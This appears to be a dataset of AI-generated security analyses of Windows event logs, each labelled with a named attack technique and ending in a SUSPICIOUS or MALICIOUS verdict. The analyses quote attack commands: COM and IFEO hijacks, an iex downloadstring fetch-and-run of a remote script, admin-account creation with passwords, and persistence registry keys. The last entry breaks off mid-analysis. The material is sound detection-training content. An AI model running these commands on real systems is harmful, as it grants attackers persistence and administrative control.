COM Hijacking with RunDLL32 (Local Server Switch),"Upon analyzing the provided Windows event logs, I have identified activities that raise suspicion of potential compromise:

### Suspicious Activities Identified:

1. **PowerShell Command Execution:**
   - Multiple logs indicate the usage of PowerShell with a command that attempts to modify the registry and execute a DLL using `RUNDLL32.EXE`. The command executed was as follows:
     ```plaintext
     ""powershell.exe"" & {New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices', New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Value \""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.015_calc.dll\"", New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Name 'ThreadingModel' -Value 'Both' -PropertyType \""String\"", Start-Process -FilePath \""C:\Windows\System32\RUNDLL32.EXE\"" -ArgumentList '-localserver {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'}
     ```
   - This activity suggests the creation of a registry key that associates a CLSID with a DLL, followed by the execution of potentially malicious DLL using `RUNDLL32.EXE`, which is a common technique used by malware for persistence or execution.

2. **Command Line Execution:**
   - The process execution from PowerShell leading to the use of `RUNDLL32.EXE` indicates an attempt to execute functionality from a DLL potentially designed to load by this process.
   
3. **Use of Temporary Directory:**
   - The DLL path specified in the PowerShell command is in a directory path that includes ""Temp"", indicating use of temporary storage, which is a common practice for malicious scripts to reduce detection before or after execution.
   
4. **High Integrity Level:**
   - The processes are running with High Integrity Level, indicating that they have administration privileges, which could potentially allow for significant system modifications.

### Assessment:

The logs contain indications of behavior that could be associated with the installation or execution of malware. The use of PowerShell to modify the registry and execute a DLL, especially in the context of a high-integrity session with admin-like privileges, is highly suspicious. The specific use of `RUNDLL32.EXE` to start a process as stated advertises typical characteristics of a malicious payload attempting to evade typical security monitoring.

### Recommendation:

- **Resolution: SUSPICIOUS**
- Further investigation is warranted to confirm whether this activity is authorized or indicates malicious compromise.
- Investigate the origin of the `data.015_calc.dll` file, verify its legitimacy, and if illegitimate, conduct forensic analysis to understand any potential threat posed by this file.
- Review user activities and any associated alerts or logs around the same timeframe to determine if this was an isolated case or a part of a broader attack vector.
- Employ system monitoring or endpoint detection solutions to identify any additional occurrences or abnormal activity linked to the same GUID or command behaviors.
- Strongly consider isolating the affected machine from the rest of the network until a full investigation is complete and security posture is assured.

These actions should be taken swiftly to manage and mitigate any possible threat stemming from these indicators."
IFEO Global Flags,"Upon reviewing the event logs provided, the following observations were made:

### Summary of Key Events 

#### System and Security Logs
1. **Time Change Events**: 
   - There are several `EventID 4616` and `EventID 1` from the Microsoft-Windows-Kernel-General and Microsoft-Windows-Security-Auditing. These indicate the system time was changed, which can be legitimate if caused by NTP synchronization. All time changes appear to have been executed by the svchost.exe under the LOCAL SERVICE context.

#### Application Logs
- **Edge Update Service**: 
  - The logs include events related to the stopping and starting of the `edgeupdate` service. This is routine behavior in environments where Microsoft Edge is regularly updated, typically via scheduled tasks or the application itself.

#### Sysmon Logs
1. **Processes Execution**:
   - Legitimate Windows processes (`wevtutil.exe`, `conhost.exe`, `wsmprovhost.exe`, `whoami.exe`, `cmd.exe`, `reg.exe`) were executed frequently. 
   - Notably, `cmd.exe` was used to modify registry settings related to Image File Execution Options (IFEO) for `notepad.exe`, which is often associated with attempts to replace or intercept application execution (potentially for persistence or evasion).
   - The presence of multiple instances of `MicrosoftEdgeUpdate.exe` suggests updates or maintenance processes. 

2. **Registry Modifications (EventID 1)**:
   - Modifications to registry keys under `Image File Execution Options` and `SilentProcessExit` for `notepad.exe` appear non-standard:
     - Assigning a registry setting to monitor a process (using IFEO) with `MonitorProcess` linked to `cmd.exe` may indicate an attempt to intercept and control application behavior which is suspicious and could be indicative of malicious activity, attempting persistence or stealthy maintenance access.

3. **Command Execution with cmd.exe**:
   - A relatively complex command line execution through `cmd.exe` suggests an automated script or malware activity designed to adjust system behavior via registry changes.

### Conclusion and Resolution
The evidence suggests behavior that deviates from typical benign operations:
- The use of `cmd.exe` for registry manipulation relating to process execution settings is a widely recognized tactic for malware to maintain persistence or steal initiation of trusted applications.
- While Edge Update-related activity aligns with standard browser update processes, registry modifications paired with command executions via CMD in an unusual pattern are potentially indicative of more than just benign operational behavior.

Given these findings, the resolution for this analysis is:

**SUSPICIOUS** - The registry manipulation via `cmd.exe` warrants further investigation to confirm the intention of these changes, as they may suggest attempts to establish persistence or interfere with legitimate processes for potential malicious purposes. Further inspections could include checking for unauthorized script deployments, potential indicators of compromise related to registry manipulations, or unusual user accounts or permissions adjustments."
Bits download using desktopimgdownldr.exe (cmd),"After reviewing the provided Sysmon logs, here is a detailed analysis of the events:

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**:
    - The logs show multiple instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` execution associated with the user `SERVER002\admin_test`. These are standard Windows system utilities but frequent repeated execution of `wevtutil.exe` in quick succession could suggest possible log manipulation or clearing attempts, which is suspicious behavior if unexplained.

2. **Process Chain with `cmd.exe`**:
    - The `cmd.exe` executions (Event record 17976 and 17978) include a command to set `SYSTEMROOT` to `C:\Windows\Temp` and downloading from a suspicious URL (`https://raw.githubusercontent.com/file/file-file/master/files/data/data.md`) using `desktopimgdownldr.exe`. This behavior is abnormal and suggests a potential attempt to execute malicious content by downloading a payload from an external source.

3. **Execution of `desktopimgdownldr.exe`**:
    - `desktopimgdownldr.exe` is executed following the above `cmd.exe` commands. This action is concerning because it is used here to download a file from the internet, indicating possible misuse to download a malicious payload.

4. **Microsoft Edge Update Executions**:
    - Numerous entries relate to Microsoft Edge Update processes executed under `NT AUTHORITY\SYSTEM`. This pattern could be normal for system updates, but it is crucial to ensure these are legitimate and properly signed by Microsoft.

5. **Overall Evaluation**:
    - While many processes like `conhost.exe` and `wevtutil.exe` under an admin context may seem regular, combining that with the `cmd.exe` execution modifying environment variables and downloading content externally raises significant red flags pointing toward possible hostile intent or exploitation.

**Assessment and Resolution**:
- **Resolution: MALICIOUS**.
- The use of `cmd.exe` to alter environment variables, coupled with unauthorized downloading from a potential malicious URL, are clear malicious indicators warranting immediate action.

**Guidance**:
1. Isolate the affected host (`Server002`) to prevent further potential lateral movement or data exfiltration.
2. Conduct a thorough forensic analysis on the host to validate the integrity of system files and detect any additional payloads downloaded or executed.
3. Consider restoring the system from backups if any unauthorized changes or malware persistence mechanisms are identified.
4. Investigate access logs and monitor network traffic for signs of further compromise.
5. Review current security policies, especially around admin account usage and execution of potentially risky commands/scripts.
"
Set Arbitrary Binary as Screensaver,"Based on the provided logs, here is the detailed analysis of each relevant area, examining suspicious behavior, and determining whether there are any indicators of malicious activity:

### Review of Logs:

#### Sysmon Log:
1. **Microsoft Edge Update Activity**: 
   - Several Sysmon events relate to `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe`. These processes are part of Microsoft Edge's regular update mechanism. They are executed by the system user `NT AUTHORITY\SYSTEM` and show typical behavior consistent with software updates.
   - These activities appear legitimate and are consistent with expected system operations, given Microsoft's involvement.

2. **`whoami.exe` Usage**:
   - The use of `whoami.exe` is recorded, which is not inherently malicious as it is commonly used for diagnostic purposes. However, it could indicate an attacker is verifying user context post-compromise.

3. **Potentially Malicious `cmd.exe` Execution**:
   - There is a concerning `cmd.exe` command line entry with indicators of potential compromise: 
     - Executing commands that modify registry settings related to screensavers, such as setting `SCRNSAVE.EXE` to `evilscreensaver.scr`. This could denote malicious activity attempting to leverage a screensaver for privilege escalation or persistence.
   - The command includes copying `cmd.exe` to `evilscreensaver.scr` and modifying registry settings to activate it, which is highly suspicious.
   - This could indicate an attempt to deploy an unauthorized executable disguised as a screensaver.

#### Security Log:
1. **Elevated Privilege Event**:
   - Event 4672 indicates the generation of a privileged token for the user `admin_test`, giving them high-level privileges like `SeDebugPrivilege` and `SeImpersonatePrivilege`. This is suspicious and might suggest an attempt to leverage administrative privileges for potentially malicious activities.

2. **Logon Events**:
   - Event 4624 shows a network logon event via NTLM for `admin_test`. Combined with the privileged token activity, this suggests potential lateral movement or unauthorized access, especially from the listed workstation `DESKTOP-3HL5B2P`.

#### Overall Analysis:
- The regular activity related to Microsoft processes (Edge Update) appears benign.
- However, the suspicious usage of `cmd.exe` with commands designed to alter system behavior and mimic convincible attack patterns indicates a high likelihood of malicious intent.
- The logon and privilege escalation related to `admin_test` align with potential malicious operations, such as a compromised user account being leveraged post-login for privilege escalation and unauthorized activities.

### Conclusion:
- **Resolution: MALICIOUS**

### Recommended Actions:
1. **Immediate Investigation**: Further investigate the user account `admin_test` for unauthorized access and assess if compromise extends beyond what is recorded.
2. **Containment**: Isolate `Server002` to prevent further propagation of potential malicious activity.
3. **Log Analysis**: Conduct a thorough review of logs, especially focusing on other machines for similar activity which can indicate lateral movement.
4. **Forensic Measures**: Capture memory and disk images for detailed forensic inspection.
5. **Endpoint Hardening**: Revert registry changes to pre-attack state, strengthen user access control, and revoke any unauthorized privileges. Deploy patches and review security policy compliance.
6. **Alert & Educate**: Notify affected parties and enhance user security awareness regarding the signs of account compromise and suspicious activity.

These steps should help mitigate the likely threats and secure the affected environment."
Persistence using automatic execution of custom DLL during RDP session,"Based on the provided logs, let's analyze each section to identify any suspicious or anomalous behavior that may suggest malicious activity on the Windows host:

### Security Log Analysis:
- **Event ID 4672** (Special Privileges Assigned to New Logon) appears twice for the user `admin_test`. The privileges assigned include potentially sensitive rights such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`, which might be leveraged by an attacker for privilege escalation. Although having these privileges assigned to an admin account can be normal, it's important to verify if `admin_test` is a legitimate administrative account.
- **Event ID 4624** (An Account was Successfully Logged On) with `LogonType 3`, indicating network logon, was recorded immediately after the privilege assignment events. This could indicate remote access, which may be suspicious if unexpected.
- **NTLM Authentication** is used, which might not be secure if not accompanied by proper network security configurations.

### System Log Analysis:
- Events indicate time synchronization and kernel activities which seem typical for regular system operations. No direct malicious activity observed in `System` logs, though time synchronization discrepancies can sometimes be indicative of tampering—none significant observed here.

### Sysmon Log Analysis:
- Several instances of processes (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) executed by `admin_test`. While `wevtutil.exe` and similar system tools are commonly used for legitimate administrative tasks, their presence, especially in combination, can also indicate malicious intentions when they're used to tamper with event logs or gather information for further attack.
- The use of `cmd.exe` to execute a registry modification command to add a DLL (`amsi.dll`) is highly suspicious. This is done through a command `reg.exe` which modifies `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\`. Such modifications can be indicative of a persistence mechanism or an attempt to bypass security measures, such as Anti-Malware Scan Interface (AMSI) bypass.
- Multiple Sysmon Event 1 logs for process creation look consistent with Edge updates, which is typical software behavior.

### Application Log Analysis:
- The Event from Software Protection Platform Service is typically harmless and related to the operation of Microsoft software license updates.

### Summary and Recommendations:
- The execution of `cmd.exe` with a registry modification command in the Sysmon logs is an indicator of potentially **MALICIOUS** behavior, as it's a known method for establishing persistence or bypassing security.
- Assigning multiple powerful privileges (e.g., `SeDebugPrivilege`) in quick succession without corresponding known legitimate actions could be **SUSPICIOUS**, especially if there are signs they are being used for unintended purposes.
  
### Resolution:
- **MALICIOUS**: The logs indicate suspicious command line usage to modify the system's registry tied to a common attack vector for persistence or security bypass. Immediate action should be taken to investigate further this behavior, check the legitimacy of actions by `admin_test`, and quarantine the involved endpoints for deeper forensic analysis.

### Next Steps:
1. Verify the legitimacy of the `admin_test` account and the timing of remote logins to Server002.
2. Investigate the origin of the initiated command for registry modification.
3. Assess the current security posture for the usage of `NTLM` and enable more secure authentication mechanisms if possible.
4. Review and enhance monitoring with more detailed alerting on sensitive privilege assignments and command executions matching suspicious patterns."
Create a new Windows admin user via .NET,"Based on the detailed analysis of the provided log entries from different categories (System, Windows PowerShell, Security, Application, and Sysmon logs), there are clear indicators of potentially malicious activity. The analysis highlights a significant finding:

### Analysis Findings:

1. **Windows PowerShell Logs:**
   - Multiple PowerShell entries indicate the execution of a script via `iex` (Invoke-Expression) command, which is known to be a potential vector for executing malicious scripts. The command `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/.../CreateNewLocalAdmin_ART.ps1')}` suggests downloading and executing a remote script aimed at persistence by creating a new local admin account. This is a strong indicator of malware or unauthorized actions.

2. **Security Logs:**
   - The logs show multiple user creations and privilege escalations. Events such as `4720`, `4722`, `4738`, and `4728` indicate the creation of a new user `NewLocalUser` and modification of its privileges. Specifically, event `4728` shows adding this new user to a group, likely administrators, which further signals malicious intent.

3. **Sysmon Logs:**
   - Process creation logs show the execution of PowerShell with the same suspicious command. These processes are initiated by the user `admin_test`, aligning with actions observed in the PowerShell logs.
   - The `net.exe` and `net1.exe` executables are used, possibly to script user account modifications (`net user` command pattern).

### Assessment:

The combination of remote script execution to create a new administrator account, the modification of user accounts, and the privilege escalation observed across these logs are strong indicators of unauthorized and potentially malicious activity. Specifically, the use of a PowerShell script to create a new local admin from a remote source without usual admin operations is highly suspect. 

### Conclusion:

- **Resolution: MALICIOUS** - The logs contain activity that strongly indicates malicious intent, especially given the execution of a script aimed at privilege escalation and persistence.

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network to prevent further compromise and lateral movement.
   - Begin an incident response process, including full forensic analysis of the host to identify the full scope of the compromise.
   - Identify and remove the unauthorized admin account (`NewLocalUser`) and any other remnants of the attack.

2. **Long-term Recommendations:**
   - Implement strict monitoring and alerting, especially for processes initiated via PowerShell and any sensitive user account changes.
   - Enhance endpoint protections to prevent unauthorized script execution.
   - Educate users on recognizing phishing and social engineering attacks, as they might have been the initial vector for this attack."
Create a new Windows admin user,"### Detailed Analysis

Upon reviewing the event logs provided, several areas of concern and observations warrant further inspection and discussion:

1. **Suspicious Account Creation:**
   - In the Sysmon log, there is a process with `cmd.exe` executing a series of `net user` and `net localgroup` commands to add a new account named `data.001_Admin` with administrative privileges:
     - CommandLine: `""cmd.exe"" /c net user /add ""data.001_Admin"" ""data_pass"" & net localgroup administrators ""data.001_Admin"" /add`
   - Corresponding Security log events `4720` (User Account Created), `4722` (User Account Enabled), and `4732` (Member added to Global Security Group) confirm this action.
   - Such activities are red flags as attackers often create accounts with elevated privileges to maintain access.

2. **Unusual Account Usage:**
   - All suspicious activities were performed by the user `SERVER002\admin_test`, indicating potential misuse or compromise of this account.

3. **High Integrity Level Processes:**
   - Multiple processes, such as `whoami.exe`, `hostname.exe`, `cmd.exe`, and others, execute at a `High` integrity level, suggesting elevated privilege sessions.
   - While these specific processes themselves might not be harmful, their use together in this context can indicate reconnaissance or privilege escalation attempts.

4. **Potential Indicators of Lateral Movement:**
   - The presence of `wsmprovhost.exe` may indicate remote or scripted command executions, possibly over a network or a PowerShell Remoting session.
   
5. **Normal Background Activity:**
   - Routine activities involving Windows Defender and system maintenance (e.g., `MpCmdRun.exe, wuauclt.exe, and Windows Update Client events) were observed. These are part of routine operations on Windows systems and not deemed suspicious in this context.

### Assessment and Resolution

**Conclusion:** While some events in the logs are consistent with normal operations (e.g., system updates and Defender activities), the creation of a new administrative account and corresponding privilege escalation attempts by `SERVER002\admin_test` are clear anomalies that indicate potential malicious intent or compromise.

**Resolution:** **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Disable or remove the account `data.001_Admin` from the system and audit all other user accounts and their privileges.
   - Investigate the user `SERVER002\admin_test` – verify whether it's been compromised. Change its credentials and review its recent activities and log-ins.
   - Ensure that command-line logging and Sysmon configuration are tuned to capture future similar events.

2. **Further Investigation:**
   - Conduct a threat hunting exercise across the network to identify any additional compromises.
   - Review other security systems (IDS/IPS, Firewall logs) for signs of unauthorized remote connections or data exfiltration.
   - Consider deploying additional endpoint detection and response solutions for more robust monitoring.

3. **Mitigation Strategies:**
   - Evaluate and possibly reinforce your organization’s password policies and multi-factor authentication for increased security.
   - Provide security training to users emphasizing the importance of recognizing phishing attempts and securing login credentials.

4. **Post-Incident Review:**
   - Document the incident thoroughly, highlighting lessons learned and updating response playbooks to enhance future detection and response efforts."
Create a new Domain Account using PowerShell,"Upon reviewing the provided Sysmon, System, Security, Windows PowerShell, and Application logs, I have identified certain components and events that suggest suspicious activity. Below is the detailed analysis:

### Suspicious Activity Identified:

1. **PowerShell Execution with New User Creation:**
   - Observed multiple Sysmon and PowerShell log entries indicating PowerShell execution with commands designed to create a new user. The commands include:
     ```powershell
     $SamAccountName = 'data.002_Admin'
     $AccountPassword = ConvertTo-SecureString 'data_pass123!' -AsPlainText -Force
     ```
   - The script utilizes `System.DirectoryServices.AccountManagement` to create a new user within a domain context:
     ```powershell
     $User = New-Object System.DirectoryServices.AccountManagement.UserPrincipal
     ```
   - This is a red flag, indicating potential unauthorized user creation on the domain, especially with a suspiciously powerful account name (`data.002_Admin`).

2. **High Privilege Execution:**
   - Multiple processes, such as `whoami.exe`, `wevtutil.exe`, and `conhost.exe`, are running at a high integrity level using the `SERVER002\admin_test` user. However, the PowerShell activity shown is significant since it indicates privilege to perform domain operations (user creation) which is unusual for regular user activity.

3. **Rapid Execution of Utility Processes:**
   - Frequent and rapid execution of processes like `whoami.exe`, `wevtutil.exe`, and `conhost.exe` within a short time frame is often a technique used in automated or scripted activities, possibly suggesting someone is trying to hide their tracks or perform actions in batch processing.

4. **Use of the `MusNotification.exe`:**
   - This is potentially benign, but the use of system processes in conjunction with the observed PowerShell user creation command context might suggest an attempt to blend malicious activities with regular system behavior.

### Indicators of Malicious Activity:

Based on the evidence, especially concerning the PowerShell actions, there is a clear indication of potentially malicious activity aimed at creating unauthorized domain users, possibly for future exploitation or persistence within the network.

### Resolution:
Considering the suspicious PowerShell activity designed to create a new user and other correlated anomalous processes, the resolution is:

- **MALICIOUS**:
  - There is significant evidence of potentially unauthorized account creation using PowerShell script execution, indicating a likely compromise aiming at creating backdoors or persistence within the domain.

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Isolate the `Server002` from the network to prevent further potential damage or unauthorized access.

2. **Conduct a Thorough Investigation:**
   - Perform detailed forensic analysis on `Server002` to trace back the source of the PowerShell script and determine any other affected systems.
   - Review domain controllers for similar new user creation or other unauthorized changes.

3. **Review User Activity:**
   - Monitor and audit user accounts for unusual behavior or recent changes, especially suspicious logons or permission escalations.

4. **Strengthen Defense:**
   - Implement enhanced monitoring and alerting for PowerShell scripts with sensitive operations.
   - Ensure PowerShell logging is fully enabled and audit logs for similar past activities.

5. **User Awareness:**
   - Provide training to administrators on being vigilant against suspicious command-line activities and detecting potential misuse of administrative privileges. 

This resolution is vital to prevent further unauthorized access, protect sensitive information, and restore affected environments."
Install Additional Authentication Packages,"After reviewing the provided Windows event logs, the following observations have been made:

1. **Time Adjustment Logs (Security and System Log EventID: 4616, 1)**:
   - These logs indicate that the system time has been adjusted. There are multiple events showing slight adjustments in the system time. 
   - While time changes could indicate suspicious actions such as anti-forensics, they may also occur due to legitimate corrections like syncing with a time server. The logs do not provide additional context to classify this as malicious purely based on these entries.

2. **Process Creation and Execution (Sysmon EventID: 1 and 5)**:
   - There are numerous process creations involving typical Windows binaries like `svchost.exe`, `conhost.exe`, `wevtutil.exe`, `whoami.exe`, and `reg.exe`. Such processes are common in normal operations.
   - However, a detailed PowerShell command execution is noted which involves writing to the Local Security Authority (LSA) in the registry and copying a potentially suspicious DLL (`filePWFilter.dll`) to `C:\Windows\System32`. The command execution suggests manipulation of authentication packages, which is highly suspicious.

3. **PowerShell Activity (PowerShell Log EventID: 600)**:
   - The logs captured a PowerShell command that performs a series of actions including exporting the registry entries and altering the `Authentication Packages` in LSA. 
   - This command's purpose seems to introduce a password filter DLL into the system, which could indicate an attempt to install a malicious backdoor or similar persistence mechanism.

4. **Application Log (SPP EventID: 16384)**:
   - No suspicious behavior identified in this log; it captures a regular operation of the Software Protection Platform.

**Assessment**:
The behavior observed with PowerShell involving registry modifications and DLL introduction stands out significantly. These activities are not typical in standard operations and can suggest an advanced level of threat such as a malware trying to maintain persistence or escalate privileges through a password filter mechanism.

**Conclusion**:
Based on the information provided and the detection of highly suspicious PowerShell activity involving critical system components, I classify this as a **MALICIOUS** event. 

**Guidance**:
- Immediate verification and isolation of the affected host (Server002) should be initiated to prevent further compromise.
- A comprehensive security review and possible removal of unauthorized modifications, especially around LSA and the suspicious DLL, should be conducted.
- Investigating the origin and entry point of the malicious script or command is recommended for further containment and mitigation measures.
- Enhancements in monitoring and detection capabilities, focusing on PowerShell activities and unusual registry changes, should be considered moving forward."
Azure AD - Create a new user via Azure CLI,"### Detailed Analysis:

1. **System Logs:**
   - The system log entries show various events related to the Windows Time Service and Kernel-General events around time synchronization. The changes in time appear to be legitimate as they are consistent with time synchronization activities using ""time.windows.com"". No anomalies or malicious indicators are evident from the System logs pertaining to these time-related events.

2. **Application Logs:**
   - A single log entry related to the Software Protection Platform Service (`sppsvc`) indicates a routine activity with no payload or anomaly detailed in the logs. Therefore, this does not suggest any suspicious behavior.

3. **Security Logs:**
   - The Security log contains events related to time changes initiated by the `svchost.exe` process with LOCAL SERVICE privileges. This is typical behavior during time synchronization and doesn't indicate any malicious intent.

4. **PowerShell Logs:**
   - The logs capture PowerShell script execution that interacts with Azure Active Directory using the `az` command-line tool. The script creates a new user in Azure AD, which appears to use hardcoded credentials. While automation scripts can be a part of normal IT operations, the presence of plaintext credentials in the script is concerning. This specific action may not inherently be malicious, but it is certainly a poor security practice that can expose sensitive information if misused or if the script is accessed by unauthorized individuals. 

5. **Sysmon Logs:**
   - The Sysmon logs show a series of processes being invoked on the system, including:
     - Regular system processes like `HOSTNAME.EXE`, `whoami.exe`, and `wevtutil.exe`.
     - Multiple instances of `conhost.exe`, which serve as legitimate parts of the Windows operating environment.
     - The routine execution of `MicrosoftEdgeUpdate.exe`, indicating a scheduled update could be taking place.
   - Notably, there are multiple invocations of `wevtutil.exe` with the command exporting event logs to potentially unauthorized locations, such as `C:\Users\ADMIN_~1\AppData\Local\Temp\TempLog.evtx`. `wevtutil.exe` usage can sometimes indicate attempts to clear or tamper with event logs, especially when seen in conjunction with paths that store logs on a User's directory.

### Assessment:

- **Suspicious PowerShell Activity**: The use of plaintext credentials within PowerShell scripts is a security risk despite being potentially part of legitimate IT operations. This aspect necessitates further scrutiny and review, particularly if the script's existence wasn't previously recognized by the IT department.
  
- **Monitoring and Event Log Manipulation Risk**: The execution of `wevtutil.exe` with commands for log exportation to unusual directories raises concerns about potentially unauthorized log access or tampering. Further investigation into why and by whom these commands are run should be considered, especially if these actions weren't part of regular maintenance or IT procedures.

### Resolution: **SUSPICIOUS**

The Windows event logs indicate suspicious activity with unclear intentions, particularly around the PowerShell script using credentialed operations in plain text and activities involving `wevtutil.exe` that potentially indicate a risk of log tampering. These actions warrant further investigation to verify if they are part of authorized operations or an indication of a potential compromise. The security team should confirm the legitimacy of the Azure AD operations and log manipulations and ensure proper controls and logging policies are enforced against misuse."
Modify Terminal Services DLL Path,"Upon analyzing the provided logs, I have identified several aspects that are worth mentioning regarding the observed activities:

### Security Log:
- **Event ID 4907**: Indicates a change in permissions of the `termsrv.dll`, a critical system file related to Remote Desktop Services. The change was executed using PowerShell by an account named ""admin_test"". The old security descriptor had standard permissions, but the new one appears unconventional (`S:PARAINO_ACCESS_CONTROL`), suggesting a custom permission setup process. This can indicate an attempt to bypass normal security restrictions.
  
### Sysmon Log:
- **Event ID 1 and 5**: Multiple instances of PowerShell execution are logged, involving potentially suspicious operations. The PowerShell command includes altering access controls on `termsrv.dll`, copying it to a different location, and attempting to modify a registry entry related to the Terminal Services (`TermService`). This could be a sign of an attempt to execute a DLL hijack or conduct privilege escalation, particularly if unapproved.

### Windows PowerShell Log:
- The PowerShell script executed aims to change the ACL on `termsrv.dll`, copy that DLL, and modify the registry to update the service using a potentially malicious DLL. These actions are typically seen in advanced persistence or privilege escalation attempts.

### Risk Assessment:
- Modifying the `termsrv.dll` and related registry entries can be indicative of attempts to alter remote service operations, possibly for unauthorized remote access.
  
### Final Assessment:
- **Resolution**: **MALICIOUS**
  
The sequence of events focusing on system file manipulation, registry adjustments related to Remote Desktop Services, and execution patterns strongly suggest potential malicious activity aimed at compromising the system’s security posture.

### Guidance:
1. **Immediate Isolation**: The server should be isolated from the network to prevent potential lateral movement if the threat actor gains remote access.
2. **Further Investigation**: A broader forensic investigation should be undertaken to confirm any unauthorized access or changes, focusing on user accounts and additional logs.
3. **Containment and Eradication**: Revert `termsrv.dll` to its default permissions and validate no unauthorized DLL files have been assigned to critical services.
4. **Review and Harden Policies**: Implement stricter policies and ensure logging and monitoring are enhanced to detect further anomalies.

The analysis indicates a sophisticated attempt that warrants an immediate and thorough response."
IFEO Add Debugger,"Upon reviewing the provided Windows event logs, several activities and entries warrant closer attention:

1. **Command-Line Execution**: There is a suspicious command-line execution recorded in the Sysmon logs. A command was run via `cmd.exe` to modify the Windows Registry, particularly an entry related to `calc.exe`:
   - `""CommandLine"": ""cmd.exe /c REG ADD \""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe\"" /v Debugger /d \""C:\\Windows\\System32\\cmd.exe\""""`
   Modifying the ""Image File Execution Options"" (IFEO) often indicates an attempt to hijack a legitimate executable (in this case, the calculator program) to execute malicious code.

2. **Unusual Process Activity**: The Sysmon logs also show multiple executions of system utilities like `whoami.exe` and `hostname.exe`, which are tools used to gather information about the system and users. Although these processes are legitimate, frequent execution in a short period or by unexpected users can be indicative of reconnaissance activity often associated with malicious behaviors.

3. **EdgeUpdate Service Activity**: There is extensive activity related to the Microsoft Edge Update process. While some of this might be legitimate, the volume and nature of logs (especially the interplay with temporary directories) suggest it warrants further verification with patch or update schedules to ensure these are intended updates.

4. **Time Change Events**: The logs document an adjustment to the system time, as recorded in both the security and system logs. This could be part of regular time sync operations, but if unauthorized, it could suggest an attempt to obscure track logs or timestamps related to illicit activities.

Based on these findings, the following assessments and action items are recommended:

### Assessment:
- **Status**: SUSPICIOUS
- **Indicators of suspicion**: Unauthorized registry manipulation, frequent system information gathering, and potential interference with system time.

### Recommendations for Further Investigation:
1. **Registry Check**: Verify the registry change regarding `calc.exe` as noted in the Sysmon log. Investigate the context and intent.
2. **User Validation**: Confirm user activities at the specified times to ascertain if they align with legitimate administrative tasks.
3. **System Integrity**: Run full scans for malware or unauthorized tools.
4. **Network Traffic Analysis**: Review any external connections made, especially during the time frame of these logs, to identify potential data exfiltration or C2 communication.
5. **Time Synchronization**: Verify if the time changes were authorized and cross-reference with other system changes or updates.

Addressing these areas will help determine if the suspicious activities observed are part of legitimate operations or a sign of a potential compromise."
HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),"Upon examining the provided Windows event logs, the following observations and analysis regarding suspicious or potentially malicious activities were made:

1. **Unusual PowerShell Activity**:
   - A PowerShell script is executed, as shown in the PowerShell event log entries and Sysmon events (Event IDs 18003-18006). The script checks for the existence of a registry path, creates it if it doesn't exist, and sets an ""AutoRun"" property to `notepad.exe` within `HKCU:\Software\Microsoft\Command Processor`.
   - This behavior is suspicious as it attempts to modify the registry to set a Start-up (AutoRun) script. Malicious actors often use such methods for persistence, causing programs to auto-execute upon user login.

2. **Granted Privileges**:
   - The `admin_test` user is operating with high integrity levels and has been granted extensive privileges such as `SeDebugPrivilege`, `SeImpersonatePrivilege`, and others (Security log Event ID 4672).
   - Although these privileges could be appropriate for certain administrative tasks, if not expected or regularly used, their presence can signify possible privilege escalation or misuse attempts.

3. **General System Use**:
   - Execution of common system utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` is seen, though these can be common administrative activities or part of malicious activity attempting reconnaissance or information gathering.
   - SVCHOST and TrustedInstaller.exe activities appear normal as they are typically related to service control and OS updates.

4. **Time Manipulation**:
   - There are logs indicating changes to system time, which could be a regular synchronization activity (likely caused by time service adjustments), but manipulations without clear reasons might suggest attempts to evade logging or timestamps alteration.

**Assessment and Threats Identified**:

- The PowerShell script invocation that manipulates the registry to create an AutoRun entry is the primary indicator of risk. This kind of activity is common in malware attempts to maintain persistence on an infected host.
- High privileges granted to `admin_test` user, if unexpected, could signify a targeted escalation or exploitation strategy.
- Time adjustment events appear less likely to be the result of malicious intent and could be routine service operations.

**Resolution**: **MALICIOUS**

Given the registry manipulation via PowerShell, which is a classic tactic for persistence and potentially unauthorized privilege use, these logs indicate a high likelihood of malicious activity. A detailed review of user `admin_test` activity, system changes, and potential further malware forensics on Server002 is recommended. Also, ensure that PowerShell execution policies and privileged user actions are adequately monitored and restricted to minimize future risks."
Create a new user in a command prompt,"### Analysis of Windows Event Logs

The provided logs cover activities on `Server002` and include entries from various Windows event sources such as Security, Sysmon, Application, and System. Below, I provide a detailed analysis based on notable entries from the logs:

#### Suspicious Entries and Indicators:
1. **Time Change Events** (`EventID: 4616` and `System` logs with time changes):
   - Multiple time change events are logged where the time was subtly adjusted backwards. This can point to attempts to manipulate time-based security mechanisms or logs. 
   - **EventID 4616** denotes a system time change which could be indicative of evasion or bypass activities.

2. **Privileged Account Activity** (`EventID: 4672, 4624, 4720, 4722, 4738, 4724`):
   - A user named `admin_test` was granted several high-privilege rights such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc. This is abnormal because such privileges should be explicitly limited to known and verified administrative actions.
   - `admin_test` created a new user account `data.001_CMD` with a password `data.001_CMD!`. There is no information supporting this account's creation as a benign or documented activity. Following this, the account was enabled and its privileges altered, which can be associated with unauthorized access preparation.

3. **Command Line Execution** (`EventID: 1 and 5` within Sysmon logs):
